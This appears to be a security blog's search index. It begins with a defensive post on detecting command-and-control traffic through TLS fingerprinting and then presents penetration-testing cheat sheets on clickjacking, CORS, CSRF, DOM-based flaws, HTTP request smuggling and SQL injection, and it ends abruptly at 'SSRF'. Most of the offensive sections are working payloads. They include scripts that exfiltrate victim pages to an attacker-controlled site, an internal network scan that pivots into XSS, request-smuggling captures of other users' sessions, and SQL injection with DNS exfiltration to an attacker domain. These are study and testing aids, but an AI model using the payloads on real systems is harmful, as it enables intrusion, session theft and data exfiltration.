[{"categories":["BlueTeam - Detection"],"content":"Behavioral and fingerprint analysis to hunt for uncovered C2 over HTTP","date":"0001-01-01","objectID":"/posts/blue_team/c2detection/","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"Summary Adversaries leverage their access to assets using initial access tool (custom or not). These tools are mainly used to get a remote session of the asset. This remote access is known as Command and Control (C2) and can be implemented through many protocols and many technics. This channel will allow adversaries to perform lateral movement, internal discovery, exfiltration and much more. Willing to hunt for C2 in companies and homemade networks, I’ve focused my effort into C2 over HTTP. ","date":"0001-01-01","objectID":"/posts/blue_team/c2detection/:1:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"C2 infrastructure C2 needs a dedicated infrastructure to work. This infrastructure must be scalable as adversaries will not only compromise about ten assets but thousands worldwide. Three models are widely implemented : Centralized Centralized model work like traditional client-server Web Apps. The client located on the compromised asset will contact the C2 server and check if any instructions as been set for him. This model involved the creation of a company like network with load balancer, defense measures (not to detect adversaries but threat researchers). They often hide themselves behind CDNs or legitimate website (compromised upstream) to mask their activities. As C2 are discovered due to incident response process, adversaries must plan for a backup solution and find innovative way to escape the full discovery. These plan might include : Use of legitimate companies solution Use social networks to gather C2 information Use steganography to obfuscate the data … Peer-to-Peer (P2P) Peer-to-Peer model is used to deliver instruction as a botnet would do it. Every compromise host knows his neighbors and relay messages to each other. This model is harder to take down, as taking down the responsible adversary will not stop the infection of these thousands of devices linked in P2P. This is mainly used as fallback channel in case of main C2 server takedown. Out of Band and Random A lot of unusual techniques have been observed to send instructions to compromised assets. Communication website like Slack, Teams, Messenger and others have been used to send instructions undetected as communications are as clean as legit ones. A lot of other technics are not known and still to be uncovered by researchers. ","date":"0001-01-01","objectID":"/posts/blue_team/c2detection/:2:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"Possible detections Many detections possibilities are used but a lot of them are not as efficient as it could be. Many analyst and companies rely on two factors: IOCs Providers These two options present a lot of inconvenient: IOCs are extracted from payloads or response teams investigations. They are very often outdated as adversaries infrastructures rotate very often, and they are also not exhaustive as unused channels are not investigated by most response teams. Keep in mind that if we can share IOC between SOC/CSIRT (or whatever name you give your analyst team), adversaries also know which endpoint / sample has leak and case easily replace/change it. Security providers don’t priories your security, they have to sell products to exist. They take choices based on marketing plan and not based on security impact. Of course, this is not a generality, but take this into account and double check features with your own tests to make sure they really perform what they are meant to. Additionally, you can study and implement detection on loader and on stage2. This is time-consuming but can be useful. Keep in mind that you need to stay updated on loader if you choose this detection path. ","date":"0001-01-01","objectID":"/posts/blue_team/c2detection/:3:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"Implemented solution As IOCs and providers product are not my go to (even if I use them). I’ve decided to build my own detection based on multiple factor to detect communication with adversaries infrastructure over HTTP. Note This solution can either be implemented by yourself or you can use the developed tool located here This detection use three aspects : Proxy logs with enrich data Fingerprinting Open source data We will combine these three aspects to create a detection that proxy provider should be implemented. Overview We know that adversaries must have a scalable architecture, which mean that automatic deployment must be used. With that type of deployment, parts of the deployed infra will not be changed (deployment methods, installed libraries, server and version used, …). These unchanged elements, can be tracked by their fingerprint. This solution is based on JARM and JA3/JA3S fingerprinting algorithms (TLS fingerprint). Quick details on these fingerprinting algorithms: JARM: The JARM fingerprint hash is a hybrid fuzzy hash, it uses the combination of a reversible and non-reversible hash algorithm to produce a 62 character fingerprint. The first 30 characters are made up of the cipher and TLS version chosen by the server for each of the 10 client hello’s sent. A “000” denotes that the server refused to negotiate with that client hello. The remaining 32 characters are a truncated SHA256 hash of the cumulative extensions sent by the server, ignoring x509 certificate data. This method is an active one. More details here. JA3: JA3 gathers the decimal values of the bytes for the following fields in the Client Hello packet; SSL Version, Accepted Ciphers, List of Extensions, Elliptic Curves, and Elliptic Curve Formats. It then concatenates those values together in order, using a “,” to delimit each field and a “-” to delimit each value in each field. This method is a passive one. More details here. JA3S: JA3S is JA3 for the Server side of the SSL/TLS communication and fingerprints how servers respond to particular clients. This method is a passive one. More details here. Detailed explanation With this information in our hand, we can now describe the solution step by step: As this detection is based on fingerprint. We need to build a database of malicious signatures. I know, I’ve said before that I don’t like IOC but that’s not a simple domain or IP, we are talking about a signature which is associated to a specific configuration and which is not related to domain nor IP. To create this database, I’m using abuse.ch updated database. The script fetch JA3/S signatures known as malicious and active domain extracted by security researchers with identified C2 tooling. The next step is to ingest these data in our database. JA3 and JA3S signatures are added to the database without any modification. For the JARM signatures, we need to scan each domain or IP and gather his signature. If you remember well the description above, adversaries also monitor their infrastructure to avoid these types of signatures to be done. To avoid any false data to be ingested, for each domain or IP we will perform the JARM scan three time and compare these three signatures. If they are identical, we ingest it to the database, if not we discard the domain/IP. Now that the database is built, we can focus on the detection system. That’s where the proxy come in. Two actions will be done from these logs: Active monitoring: JA3 and JA3S are passive methods. These signatures are generated from PCAP data. Nothing more simple to do when we’ve got a proxy on our end. Each time a request is done through the proxy, these signatures are generated and added to the DB (linked with the IP/Domain). A comparison is done with the malicious data we ingested earlier. If the JA3 AND the JA3S match, the connection is closed and the website is categorized as malicious (no more connection will be created for this destination). Passive monitoring: As web navigation data in companie","date":"0001-01-01","objectID":"/posts/blue_team/c2detection/:4:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"Conclusion As adversaries find new ways to implement their Command and Control, we need to find new ways to implement a durable solution. To do so, the implementation of solution needs to go higher and higher in the pyramid of pain model. This solution is almost on the top of this pyramid as it cover at least everything under “Network and hosts artifacts” and quite a bit of the “Tools” section. Keep in mind that you need to understand the overall solution to build a solution yourself or to use the one I’ve created. If you have ideas to improve this detection, don’t hesitate to contact me. ","date":"0001-01-01","objectID":"/posts/blue_team/c2detection/:5:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["Penetest - Web"],"content":"Clickjacking cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/clickjacking/","tags":["web","penetest","clickjacking","phishing"],"title":"Clickjacking","uri":"/posts/penetration_testing/clickjacking/"},{"categories":["Penetest - Web"],"content":"Clickjacking Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. Example (from imperva.com) : The attacker creates an attractive page which promises to give the user a free trip to Tahiti. In the background the attacker checks if the user is logged into his banking site and if so, loads the screen that enables transfer of funds, using query parameters to insert the attacker’s bank details into the form. The bank transfer page is displayed in an invisible iframe above the free gift page, with the “Confirm Transfer” button exactly aligned over the “Receive Gift” button visible to the user. The user visits the page and clicks the “Book My Free Trip” button. In reality the user is clicking on the invisible iframe, and has clicked the “Confirm Transfer” button. Funds are transferred to the attacker. The user is redirected to a page with information about the free gift (not knowing what happened in the background). ","date":"0001-01-01","objectID":"/posts/penetration_testing/clickjacking/:0:0","tags":["web","penetest","clickjacking","phishing"],"title":"Clickjacking","uri":"/posts/penetration_testing/clickjacking/"},{"categories":["Penetest - Web"],"content":"Some examples Basic clickjacking with CSRF token protection Construct a page looking like : \u003cstyle\u003e iframe { position:relative; width:$width\\_value; height: $height\\_value; opacity: $opacity; // Set opacity to make the button transparent z-index: 2; } div { position:absolute; top:$top\\_value; // Change this to fully cover the baiting action left:$side\\_value; // Change this to fully cover the baiting action z-index: 1; } \u003c/style\u003e \u003cdiv\u003eTest me\u003c/div\u003e \u003ciframe src=\"$url\"\u003e\u003c/iframe\u003e Send the link to the victime and pray Clickjacking with form input data prefilled from a URL parameter Construct a page looking like : \u003cstyle\u003e iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } \u003c/style\u003e \u003cdiv\u003eTest me\u003c/div\u003e \u003ciframe src=\"$url?email=hacker@attacker-website.com\"\u003e\u003c/iframe\u003e Send the link to the victime and pray Exploiting clickjacking vulnerability to trigger DOM-based XSS Construct a page looking like: \u003cstyle\u003e iframe { position:relative; width:$width\\_value; height: $height\\_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top\\_value; left:$side\\_value; z-index: 1; } \u003c/style\u003e \u003cdiv\u003eTest me\u003c/div\u003e \u003ciframe src=\"$url?name=\u003cimg src=1 onerror=alert(document.cookie)\u003e\u0026email=hacker@attacker-website.com\u0026subject=test\u0026message=test#feedbackResult\"\u003e\u003c/iframe\u003e Send the link to the victime and pray Multistep clickjacking Just include as much button as you need \u003cstyle\u003e iframe { position:relative; width:$width\\_value; height: $height\\_value; opacity: $opacity; z-index: 2; } .firstClick, .secondClick { position:absolute; top:$top\\_value1; left:$side\\_value1; z-index: 1; } .secondClick { top:$top\\_value2; left:$side\\_value2; } \u003c/style\u003e \u003cdiv class=\"firstClick\"\u003eTest me first\u003c/div\u003e \u003cdiv class=\"secondClick\"\u003eTest me next\u003c/div\u003e \u003ciframe src=\"$url\"\u003e\u003c/iframe\u003e ","date":"0001-01-01","objectID":"/posts/penetration_testing/clickjacking/:1:0","tags":["web","penetest","clickjacking","phishing"],"title":"Clickjacking","uri":"/posts/penetration_testing/clickjacking/"},{"categories":["Penetest - Web"],"content":"How to prevent them Two main option are in use to prevend them: X-frame-options: deny : Make the site impossible to include into ifram balise sameorigin: Make ifram only useable on the same website allow-from: Specify URL that can include the website iframe CSP: You can use a lot of CSP option to restrict page inclusion ","date":"0001-01-01","objectID":"/posts/penetration_testing/clickjacking/:2:0","tags":["web","penetest","clickjacking","phishing"],"title":"Clickjacking","uri":"/posts/penetration_testing/clickjacking/"},{"categories":["Penetest - Web"],"content":"CORS cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/cors/","tags":["web","penetest","cors"],"title":"CORS attack","uri":"/posts/penetration_testing/cors/"},{"categories":["Penetest - Web"],"content":"Cross-origin resource sharing Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It can provide an attack vector to cross-domain based attacks, if a website’s CORS policy is poorly configured and implemented. To check for the Access-Control-Allow-Origin value you can send a request including the following header: Origin: WEBSITE The presence of Access-Control-Allow-Credentials is a good indicator of potential CORS. ","date":"0001-01-01","objectID":"/posts/penetration_testing/cors/:0:0","tags":["web","penetest","cors"],"title":"CORS attack","uri":"/posts/penetration_testing/cors/"},{"categories":["Penetest - Web"],"content":"Some examples Basic origin reflection On your website you can place a script looking like this one : \u003cscript\u003e var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','FULL_URL_TO_TARGET',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; \u003c/script\u003e This script will fetch the FULL_URL_TO_TARGET page using the Access-Control-Allow-Credentials header. Then when the page will be loaded, it will take the page data and send it back to you on your website. Trusted null origin Basicly this is the same as the previous one, just include the ifram with sandbox options: sandbox=\"allow-scripts allow-top-navigation allow-forms\" \u003ciframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, \u003cscript\u003e var req = new XMLHttpRequest (); req.onload = reqListener; req.open('get','FULL_URL_TO_TARGET',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR_WEBSITE/log?key='+encodeURIComponent(this.responseText); }; \u003c/script\u003e\"\u003e\u003c/iframe\u003e Internal network pivot attack This one is the trickier, it will follow these steps: Scan for endpoint in the internal network, it will fetch a XSS on the scanned page, your website log should include port and the corresponding IP. \u003cscript\u003e var q = [], collaboratorURL = 'YOURWEBSITE'; for(i=1;i\u003c=255;i++){ q.push( function(url){ return function(wait){ fetchUrl(url,wait); } }('http://192.168.0.'+i+':8080')); } for(i=1;i\u003c=20;i++){ if(q.length)q.shift()(i*100); } function fetchUrl(url, wait){ var controller = new AbortController(), signal = controller.signal; fetch(url, {signal}).then(r=\u003er.text().then(text=\u003e { location = collaboratorURL + '?IP='+url.replace(/^http:\\/\\//,'')+'\u0026code='+encodeURIComponent(text)+'\u0026'+Date.now() } )) .catch(e =\u003e { if(q.length) { q.shift()(wait); } }); setTimeout(x=\u003e{ controller.abort(); if(q.length) { q.shift()(wait); } }, wait); } \u003c/script\u003e Then you will be able to go for XSS fetching, using information previously retrieve \u003cscript\u003e function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'\u0026username='+encodeURIComponent(vector)+'\u0026password=test\u0026csrf='+text.match(/csrf\" value=\"(\\[^\"\\]+)\"/)\\[1\\]; } function fetchUrl(url, collaboratorURL){ fetch(url).then(r=\u003er.text().then(text=\u003e { xss(url, text, '\"\u003e\u003cimg src='+collaboratorURL+'?isXSS=1\u003e'); } )) } fetchUrl(\"http://IP_FOUND\", \"YOURWEBSITE\"); \u003c/script\u003e From the previous step, you will locate a potential XSS, if you find one it would be display in your website logs using isXSS=1. In this part we will go for the XSS exploit and retrieve the web page content. \u003cscript\u003e function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'\u0026username='+encodeURIComponent(vector)+'\u0026password=test\u0026csrf='+text.match(/csrf\" value=\"(\\[^\"\\]+)\"/)\\[1\\]; } function fetchUrl(url, collaboratorURL){ fetch(url).then(r=\u003er.text().then(text=\u003e { xss(url, text, '\"\u003e\u003ciframe src=/admin onload=\"new Image().src=\\\\''+collaboratorURL+'?code=\\\\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)\"\u003e'); } )) } fetchUrl(\"http://IP_FOUND\", \"YOURWEBSITE\"); \u003c/script\u003e Then you are free to do whatever you want, iframe injection, CSRF, … ","date":"0001-01-01","objectID":"/posts/penetration_testing/cors/:1:0","tags":["web","penetest","cors"],"title":"CORS attack","uri":"/posts/penetration_testing/cors/"},{"categories":["Penetest - Web"],"content":"How to prevent them CORS are only present due to misconfigurations, you can use these headers to configure it correctly (and also use your brain again). Access-Control-Allow-Origin: Allow content from listed websites Avoid null value =\u003e can be exploit as we see above Avoid local things as you don’t protect your colleagues actions ","date":"0001-01-01","objectID":"/posts/penetration_testing/cors/:2:0","tags":["web","penetest","cors"],"title":"CORS attack","uri":"/posts/penetration_testing/cors/"},{"categories":["Penetest - Web"],"content":"CSRF cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/csrf/","tags":["web","penetest","csrf"],"title":"CSRF attack","uri":"/posts/penetration_testing/csrf/"},{"categories":["Penetest - Web"],"content":"Cross-site request forgery Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. This attack can happend by phishing, clone site, etc … Conditions have to be present for this attack to be perform : A relevant action. : Change password, email, rights, … Cookie-based session handling. : Website with cookie base for sessions are an incredible candidate for this type of attack No unpredictable request parameters. Every element should be known or obtainable to be able to forge the request Here is a schema to check for CSRF from PATT: ","date":"0001-01-01","objectID":"/posts/penetration_testing/csrf/:0:0","tags":["web","penetest","csrf"],"title":"CSRF attack","uri":"/posts/penetration_testing/csrf/"},{"categories":["Penetest - Web"],"content":"Some examples No defenses \u003cform method=\"$method\" action=\"$url\"\u003e \u003cinput type=\"hidden\" name=\"$param1name\" value=\"$param1value\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms\\[0\\].submit(); \u003c/script\u003e JSon and JS combined \u003cscript\u003e var xhr \\= new XMLHttpRequest(); xhr.open(\"POST\", \"http://www.example.com/api/setrole\"); xhr.setRequestHeader(\"Content-Type\", \"text/plain\"); //xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); //xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\"); xhr.send('{\"role\":admin}'); \u003c/script\u003e ","date":"0001-01-01","objectID":"/posts/penetration_testing/csrf/:1:0","tags":["web","penetest","csrf"],"title":"CSRF attack","uri":"/posts/penetration_testing/csrf/"},{"categories":["Penetest - Web"],"content":"How to prevent them Unpredictable with high entropy, as for session tokens in general. Tied to the user’s session. Strictly validated in every case before the relevant action is executed. ","date":"0001-01-01","objectID":"/posts/penetration_testing/csrf/:2:0","tags":["web","penetest","csrf"],"title":"CSRF attack","uri":"/posts/penetration_testing/csrf/"},{"categories":["Penetest - Web"],"content":"DOM-based vulnerabilities cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/dom-based_vulnerabilities/","tags":["web","penetest","dom-based"],"title":"DOM-based vulnerabilities","uri":"/posts/penetration_testing/dom-based_vulnerabilities/"},{"categories":["Penetest - Web"],"content":"DOM-based vulnerabilities DOM-based vulnerabilities are based on javascript values controlled by attackers called source and use it in dangerous functions called sink (values can be cookies or whatever and functions can be eval like ones so by modifying the cookie you’ve got RCE). Sources are very often : document.URL document.documentURI document.URLUnencoded document.baseURI location document.cookie document.referrer window.name history.pushState history.replaceState localStorage sessionStorage IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) Database Sink related to vulnerabilites are (thanks to portswigger): DOM-based vulnerability Example sink DOM XSS document.write() Open redirection window.location Cookie manipulation document.cookie JavaScript injection eval() Document-domain manipulation document.domain WebSocket-URL poisoning WebSocket() Link manipulation someElement.src Web-message manipulation postMessage() Ajax request-header manipulation setRequestHeader() Local file-path manipulation FileReader.readAsText() Client-side SQL injection ExecuteSql() HTML5-storage manipulation sessionStorage.setItem() Client-side XPath injection document.evaluate() Client-side JSON injection JSON.parse() DOM-data manipulation someElement.setAttribute() Denial of service RegExp() There is also DOM clobbering, same goal, different approach, your goal here is to inject HTML and then perform DOM basis ","date":"0001-01-01","objectID":"/posts/penetration_testing/dom-based_vulnerabilities/:0:0","tags":["web","penetest","dom-based"],"title":"DOM-based vulnerabilities","uri":"/posts/penetration_testing/dom-based_vulnerabilities/"},{"categories":["Penetest - Web"],"content":"Some examples Web messages Here you are in the situation where your page contained an addEventListener and wait for an input You can put the following message: \u003ciframe src=\"WEBSITE\" onload=\"this.contentWindow.postMessage('\u003cimg src=1 onerror=alert(document.cookie)\u003e','\\*')\"\u003e OR \u003ciframe src=\"WEBSITE\" onload=\"this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','\\*')\"\u003e OR \u003ciframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage(\"{\\\\\"type\\\\\":\\\\\"load-channel\\\\\",\\\\\"url\\\\\":\\\\\"javascript:alert(document.cookie)\\\\\"}\",\"\\*\")'\u003e Base your payload on the method use to upload a message. The iframe will post the message and dump it on the page, you will be able to get the cookie that way DOM-based open redirection The website have a similar output than the following one : \u003ca href='#' onclick='returnURL' = /url=https?:\\\\/\\\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl\\[1\\];else location.href = \"/\"'\u003eBack to Blog\u003c/a\u003e So you can use it by sending for example the following url : https:/WEBSITE/post?postId=4\u0026url=YOURWEBSITE DOM-based cookie manipulation Here is an example for the following scenario : You are on a website that store last page seen as a cookie Your first action is to inject an iframe where you match an existing page and add some payload after it. When the iframe is load by the victime browser, it will open the src temporarily and set the cookie to the payload Then the iframe will execute the onload function and redirect the victime to an other page of your choice. By loading the page the cookie will be stored and execute so is your payload, the victime is not able to see it in anyway (if your victime is Mr/Mrs Michu) \u003ciframe src=\"WEBSITE/sell?productId=1\u0026'\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\" onload=\"if(!window.x)this.src='WEBSITE';window.x=1;\"\u003e ","date":"0001-01-01","objectID":"/posts/penetration_testing/dom-based_vulnerabilities/:1:0","tags":["web","penetest","dom-based"],"title":"DOM-based vulnerabilities","uri":"/posts/penetration_testing/dom-based_vulnerabilities/"},{"categories":["Penetest - Web"],"content":"How to prevent it Not much to do. Just handle untrusted data carefully and perform all required checks. ","date":"0001-01-01","objectID":"/posts/penetration_testing/dom-based_vulnerabilities/:2:0","tags":["web","penetest","dom-based"],"title":"DOM-based vulnerabilities","uri":"/posts/penetration_testing/dom-based_vulnerabilities/"},{"categories":["Penetest - Web"],"content":"SQL injection cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/httpsmugling/","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"HTTP request smuggling HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. HTTP request smuggling is an attack based on bad request handling between front and backend. The front end receive the user packet and transfer data or request to the backend. In that way you can chunk your original request and perform a double request in one paquet send. In that way you can bypass some protections. Different types of HTTP request smuggling exist, they are : CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. ","date":"0001-01-01","objectID":"/posts/penetration_testing/httpsmugling/:0:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"Basics Basic CL.TE vulnerability You have to send a chunk request passing low content length to perform double requests in one, Here is an example: POST / HTTP/1.1 Host: WEBSITE Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G Basic TE.CL vulnerability Same as previous with a well formed double request, here is an example: POST / HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 ","date":"0001-01-01","objectID":"/posts/penetration_testing/httpsmugling/:1:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"Confirming vulnerabilities Confirming a CL.TE vulnerability via differential responses Using same technique as previous you can target a page you are sure about the response like 404, home or whatever. The request should return the page on the second header. Here is an example POST / HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X Confirming a TE.CL vulnerability via differential responses Same thing as before just a different way to do it. Here is an example: POST / HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 ","date":"0001-01-01","objectID":"/posts/penetration_testing/httpsmugling/:2:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"Bypass front-end protections Bypass front-end security controls, CL.TE vulnerability Here is an example of how you can bypass the front to make the back do what you want (that’s an example and you really have to adapt it): POST / HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding: chunked 0 GET /admin/add?username=test\u0026password=test HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= Bypass front-end security controls, TE.CL vulnerability Same thing as before, just the necessary change: POST / HTTP/1.1 Host: WEBSITE Content-length: 4 Transfer-Encoding: chunked 87 GET /admin/add?username=test\u0026password=test HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 ","date":"0001-01-01","objectID":"/posts/penetration_testing/httpsmugling/:3:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"Advanced Exploiting HTTP request smuggling to capture other users’ requests You need to be able to have a field that is at the end of your post data and to be able to update a site field or comment or post or … In that way you will catch the other user requests by redirect it back to your data in your post request. Here is an example: GET / HTTP/1.1 Host: WEBSITE Transfer-Encoding: chunked Content-Length: 324 0 POST /post/comment HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-Length: 400 Cookie: session=YOURCOOKIE csrf=CSRFTOKEN\u0026postId=2\u0026name=YOURNAME\u0026email=EMAIL\u0026comment= ","date":"0001-01-01","objectID":"/posts/penetration_testing/httpsmugling/:4:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"How to prevent them How can implement a rejection of wierd / malformed request or also do these following actions : Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection. Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests. Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests. ","date":"0001-01-01","objectID":"/posts/penetration_testing/httpsmugling/:5:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"SQL injection cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/sqli/","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"SQL injection A SQL injection (SQLi) is a type of security exploit in which the attacker adds Structured Query Language (SQL) code to a Web form input box in order to gain access to unauthorized resources or make changes to sensitive data. An SQL query is a request for some action to be performed on a database. When executed correctly, a SQL injection can expose intellectual property, the personal information of customers, administrative credentials or private business details. ","date":"0001-01-01","objectID":"/posts/penetration_testing/sqli/:0:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"SQLi Basics Here will be some basics informations to get when you have a successfull injection SQL injection attack, querying the database type and version on Oracle Depending on the DB you can get the version as follow: Microsoft, MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() SQL injection attack, listing the database contents Non-Oracle DB select * from information\\_schema.tables Oracle DB select * from all_tables ","date":"0001-01-01","objectID":"/posts/penetration_testing/sqli/:1:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"Union SQL attack These attacks are perform to extract data using the same amount of row than the initial result could display. For this attack, working conditions are: The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries You can have those following examples : Determining the number of columns returned by the query : Using Union : ' union select NULL-- Increasing number of NULL value until values are actually return Using Order : ' order by 1-- Increasing the int value until an error occured Finding a column containing text union select 'a', NULL, NULL, ...-- Add as many null as you need to match the number of columns Retrieving data from other tables union select CHAMP1, CHAMP2, .... from TABLE_NAME-- Again add as many null value as needed Retrieving multiple values in a single column union select CHAMP1 || 'SEPERATOR' || CHAMP2 .... from TABLE_NAME-- Very usefull when you only have the capacity to extract data from a uniq column ","date":"0001-01-01","objectID":"/posts/penetration_testing/sqli/:2:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"Blind SQL attack Conditional responses The goal here is to exfiltrate char by char fields using for exemple a query looking like this one : ' and (select substring(password,1,1) from users where username='administrator')='a Conditional errors The goal here is to check errors based on a True query and on a false one. Here is an example: True statement : ' and (select case when (1=2) then 1/0 else 'a' end)='a False statement : ' and (select case when (1=1) then 1/0 else 'a' end)='a Time delays This one is the favorite of everyone to quickly check for blind SQL. The goal is to insert a sleep function (once or twice to confirm it) and check if there is any latence in the anwser given by the server. If there is one, and if this latence is proportionate to your sleep value, then you know that you’ve got SQLi. Examples : Using sleep: ';sleep(10)-- Using waitfor : '; if (1=1) waitfor delay '0:0:5'-- Time delays and information retrieval Using the techique right above, we can exfiltrate data based on the time the query take to give a result. We will stick with conditional tested char by char. Here is an example : '; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) \u003e 'm') = 1 waitfor delay '0:0:5'-- Out-of-band (OAST) This type of SQLi is perform against asynchronous system. The goal here is to trigger out-of-band network. We usually use DNS protocol because that’s simplier and available on any system. To exfiltrate data we will use conditionals techniques again and more precisely a time delays equivalent. Basicly we will redirect to our controlled domain on True or False condition. For example we can perform those : For Microsoft SQL Server Basic test: '; exec master..xp\\_dirtree '//MYDOMAIN/a'-- Data on subdomain: declare @q varchar(1024); set @q = 'master..xp\\_dirtree '\\\\\\\\' + substring(convert(varchar(max), convert(varbinary(max), user\\_name()), 1),1,60) + '.MYDOMAIN\\\\foo'; exec(@q) MYSQL Check for the LOAD_FILE, sys_eval, http_get, .. functions ORACLE select dbms_ldap.init((select version from v$instance)||'.'||(select user from dual)||'.'||(select name from v$database)||'.'|'MYDOMAIN',80) from dual; SQL injection vulnerability allowing login bypass Very simple : username'-- ","date":"0001-01-01","objectID":"/posts/penetration_testing/sqli/:3:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"How to prevent them If a SQL injection attack is successfully carried out, the damage could be expensive in terms of resources and customer trust. That is why detecting this type of attack in a timely manner is important. Web application firewalls (WAF) are the most common tool used to filter out SQLi attacks. WAFs are based on a library of updated attack signatures and can be configured to flag malicious SQL queries. In order to prevent a SQL injection attack from occurring in the first place, developers can follow these practices: Avoid SQL statements that allow user input, choose prepared statements and parameterized queries instead. Perform input validation, or sanitization, for user-provided arguments. Do not leave sensitive data in plaintext format, or use encryption. Limit database permissions, privileges and capabilities to the bare minimum. Keep databases updated on security patches. Routinely test the security measures of applications that rely on databases. Remove the display of database error messages to the users. ","date":"0001-01-01","objectID":"/posts/penetration_testing/sqli/:4:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"SSRF 